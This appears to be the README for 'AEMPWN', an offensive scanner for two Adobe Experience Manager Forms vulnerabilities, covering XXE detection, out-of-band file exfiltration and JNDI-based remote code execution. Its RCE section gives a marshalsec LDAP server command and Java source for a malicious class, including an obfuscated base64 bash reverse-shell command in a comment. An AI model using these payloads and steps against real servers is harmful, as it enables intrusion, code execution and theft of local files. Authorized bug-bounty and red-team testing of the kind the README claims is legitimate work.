AEMPWN

AEM Forms Scanner for CVE-2025-54253 & CVE-2025-54254

AEMPWN is a targeted scanner for identifying high-risk Adobe Experience Manager (AEM) Forms vulnerabilities, with support for safe detection, blind out-of-band (OOB) confirmation, and full proof-of-concept (PoC) validation workflows.
This tool is designed for authorized security testing only.

Supported Vulnerabilities

CVE-2025-54253
Configuration-dependent remote code execution in AEM Forms (JEE)

CVE-2025-54254
XML External Entity (XXE) injection leading to file disclosure and potential escalation

Modes of Operation
AEMPWN supports three execution modes to align with real-world bounty and red team workflows.

1. Safe PoC Mode (--poc)

Purpose:
Identify unsafe XML parsing behavior and viable exploit surface without triggering destructive behavior.

What it validates:
XML reflection
Non-HTML structured responses
Canary token reflection
Indicators of insecure XML handling

Use when:
You want low-noise validation
You are still mapping impact
You need a safe signal before escalation
This mode is suitable for early triage and internal reporting.

2. OOB XXE Mode (--oob)

Purpose:
Confirm blind XXE via outbound requests from the AEM server.

Important clarification:
Burp Collaborator (or similar services) only observe outbound connections. They do not:
Host arbitrary DTD files
Serve malicious payloads
Return attacker-controlled responses
Support LDAP/JNDI exploitation

Because of this, Collaborator alone is insufficient for full OOB XXE exploitation.

What you need:
An HTTP server you control (VPS, cloud instance, local server with tunneling, etc.)
The ability to serve a DTD file
The ability to observe inbound HTTP requests and query parameters

What this proves:
The XML parser fetches external entities
The target makes outbound network requests
Sensitive local files can be read and exfiltrated

3. RCE Mode (--rce)

Purpose:
Demonstrate actual code execution on the AEM server for P1-level impact.

This mode relies on JNDI injection via XML parsing, which requires infrastructure beyond HTTP callbacks.

What you need:
A running LDAP server capable of serving a Java class reference
An HTTP server hosting a compiled Java class
A controlled execution primitive (e.g., file creation, outbound callback)

Why LDAP is required:
The XML parser attempts to resolve a JNDI reference
This causes the AEM server to connect to your LDAP listener
The LDAP response points to a Java class
The class is loaded and executed by the JVM

Best tool: marshalsec 
```java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-server/#Exploit" 1389
```
http://your-server/#Exploit = HTTP server serving Exploit.class (compiled malicious class).

Malicious class example (simple touch /tmp/pwned or reverse shell):
```java
Javaimport java.io.IOException;
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("touch /tmp/pwned");
            // or reverse shell: Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}");
        } catch (IOException e) {}
    }
} 
``` 
Compile → host on HTTP server (same as DTD or separate).
When AEM parses the entity → connects to your LDAP → fetches class → executes code.

Key limitation:

Burp Collaborator cannot:
Serve LDAP responses
Host Java classes
Trigger JNDI-based class loading
For this reason, RCE mode cannot work without a real LDAP service.

About Burp Collaborator
Burp Collaborator (and similar platforms) are useful for detection only.

They can confirm:
DNS lookups
HTTP or HTTPS callbacks
Blind outbound connectivity

They cannot:
Host DTD files
Process exfiltrated file contents
Serve Java classes
Support JNDI or LDAP-based exploitation

Use Collaborator to observe, not to deliver payloads.

Output:

Confirmed findings are written to an output file (default: aem-forms-scan.txt) and include:
Target base URL
Affected endpoint
Detection signals observed
Mode-specific indicators
Video-PoC friendly
